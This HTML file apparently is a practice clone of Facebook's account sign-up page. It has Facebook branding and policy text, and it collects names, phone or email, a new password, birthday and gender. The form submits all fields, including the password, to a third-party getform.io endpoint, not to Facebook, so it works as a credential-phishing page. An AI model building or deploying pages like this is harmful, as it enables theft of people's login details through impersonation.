<!DOCTYPE html>
<html lang="en">
    <head> 
        <meta charset="UTF-8"> 
        <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>FB Form</title>
        <link href="css/style.css" rel="stylesheet">
    </head>
    <body>
        <section id="grid_container">
            <header>
                <div class="logo"></div>
                <img src="images/fb_logo.svg">
            </header>
            <main>
                <form method="POST" action="https://getform.io/f/0d2dfd6a-b23b-4f37-9354-bd5f6f051b4e">
                    <h2>Create a new account</h2>
                    <h4>it' quick and easy.</h4>
                    <hr>
                    <div class="border">
                    <br>
                    <br>
                    <div class="text_input">
                        <input
                            required
                            minlength="5"
                            maxlength="15" 
                            type="code_text" 
                            id="code_first_name_id" 
                            name="code_first_name"
                            placeholder="First Name">
                        <input
                            required
                            minlength="5"
                            maxlength="15" 
                            type="text" 
                            id="code_last_name_id" 
                            name="code_last_name"
                            placeholder="Last Name">
                    </div>
                    <div class="text_mobile">
                        <br>
                        <label for="mobile_number_email_id"></label>
                        <input type="mobile_number_email" id="mobile_number_email_id" name="mobile_number_email" placeholder="Mobile Number Or Email">
                    </div>
                    <div class="text_password">
                        <br>
                        <label for="new_password_id"></label>
                        <input type="new_password" id="new_password_id" name="new_password" placeholder="New Password">
                    </div>
                    <div class="text_birthday">Birthday</div>
                    <div id="birthday">
                        <select id="birthday_id" name="birthday_id">
                            <option value="aug">Aug</option>
                            <option value="sep">Sep</option>
                            <option value="oct">Oct</option>
                        </select>
                        <select id="birthday_id" name="birthday_id">
                            <option value="25">25</option>
                            <option value="26">26</option>
                            <option value="27">27</option>
                        </select>
                        <select id="birthday_id" name="birthday_id">
                            <option value="1988">1988</option>
                            <option value="1989">1989</option>
                            <option value="2023">2023</option>
                        </select>
                    </div>
                    <br>
                    <div id="gender">
                        <label for="gender_id">
                            <div class="gender">
                            Gender
                        </label>
                            <div id="female">
                                <input type="radio" id="acvc" name="female" value="acvc">
                                <label for="acvc_radio">Female</label>
                            </div>
                            <div id="male">
                                <input type="radio" id="acvc" name="male" value="acvc">
                                <label for="acvc_radio">Male</label>
                            </div>
                            <div id="custom">
                                <input type="radio" id="acvc" name="custom" value="acvc">
                                <label for="acvc_radio">Custom</label>
                            </div>
                    </div>
                    <div class="inf">
                    <p>
                        People who use our service may have uploaded your contact information to Facebook. <a href="#learn more">Learn more.</a>
                    </p>
                    <p>
                        By clicking Sign Up, you agree to our <a href="#Terms"> Terms</a>, <a href="#Privacy Policy"> Privacy Policy</a> and <a href="#Cookies"> Cookies</a> <a href="#Policy"> Policy.</a> You may receive SMS Notifications from us and can opt out any time.


                    </p>
                    </div>
                    <div>
                        <br>
                        <input type="submit" value="Sign Up">
                    </div>
                    <h3>Already have an account?</h3>
                </form>
            </div>
            </main>
        </section> 
    </body>
</html>
